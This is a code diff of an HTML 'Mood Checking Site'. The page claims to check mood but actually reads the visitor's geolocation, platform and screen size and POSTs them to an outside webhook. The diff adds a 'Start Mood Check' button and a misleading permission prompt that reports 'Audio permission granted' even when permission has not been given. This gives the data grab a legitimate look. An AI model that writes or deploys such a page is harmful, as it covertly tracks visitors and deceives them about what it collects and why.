@@ -5,46 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mood Checking Site</title>
     <script>
-        let voices = [];
-
-        function initializeVoices() {
-            voices = window.speechSynthesis.getVoices();
-            if (voices.length === 0) {
-                // Chrome may require voices to be loaded asynchronously
-                const waitForVoices = setInterval(() => {
-                    voices = window.speechSynthesis.getVoices();
-                    if (voices.length > 0) {
-                        clearInterval(waitForVoices);
-                    }
-                }, 100);
+        function requestAudioAccess() {
+            // Check if the user has granted permission to play audio
+            if (!navigator.permissions) {
+                alert("Your browser doesn't support the Permissions API.");
+                return;
             }
+
+            navigator.permissions.query({ name: 'microphone' }).then((result) => {
+                if (result.state === 'granted' || result.state === 'prompt') {
+                    alert("Audio permission granted! Starting the mood check...");
+                    startMoodCheck();
+                } else {
+                    alert("Please enable audio permissions to proceed.");
+                }
+            }).catch((err) => {
+                console.error("Permission check failed:", err);
+                alert("Error while requesting permission for audio.");
+            });
         }
 
         function speak(text) {
-            if ('speechSynthesis' in window) {
-                const speech = new SpeechSynthesisUtterance(text);
-                speech.lang = 'en-US';
-                speech.rate = 1;
-                speech.pitch = 1;
-
-                // Select a preferred voice if available
-                const preferredVoice = voices.find(voice => voice.name === 'Google US English');
-                if (preferredVoice) {
-                    speech.voice = preferredVoice;
-                }
-
-                window.speechSynthesis.speak(speech);
-            } else {
-                console.warn("Speech synthesis is not supported in this browser.");
-                alert("Speech synthesis is not supported in this browser.");
-            }
+            const speech = new SpeechSynthesisUtterance(text);
+            speech.lang = 'en-US';
+            speech.rate = 1;
+            speech.pitch = 1;
+            window.speechSynthesis.speak(speech);
         }
 
         function sendDeviceInfo() {
             const statusElement = document.getElementById("status");
-            const moodCheckingMessage = "Mood is checking...";
-            statusElement.textContent = moodCheckingMessage;
-            speak(moodCheckingMessage);
+            statusElement.textContent = "Mood is checking...";
+            speak("Mood is checking...");
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -55,7 +47,6 @@
                         const platform = navigator.platform;
                         const screenResolution = `${window.screen.width}x${window.screen.height}`;
 
-                        // Send data to the backend API
                         fetch('https://hooks-two-zeta.vercel.app/send-info', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
@@ -92,18 +83,14 @@
             }
         }
 
-        window.onload = () => {
-            if ('speechSynthesis' in window) {
-                initializeVoices();
-                // Ensure voices are loaded before attempting to speak
-                window.speechSynthesis.onvoiceschanged = initializeVoices;
-            }
+        function startMoodCheck() {
             sendDeviceInfo();
-        };
+        }
     </script>
 </head>
 <body style="height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;">
-    <h1>Welcome to mood checking website...</h1>
-    <p id="status" style="font-size: 1.2em; color: #333;"></p>
+    <h1>Welcome to the Mood Checking Site</h1>
+    <button onclick="requestAudioAccess()" style="padding: 10px 20px; font-size: 1em; margin-top: 20px;">Start Mood Check</button>
+    <p id="status" style="font-size: 1.2em; color: #333; margin-top: 20px;"></p>
 </body>
 </html>
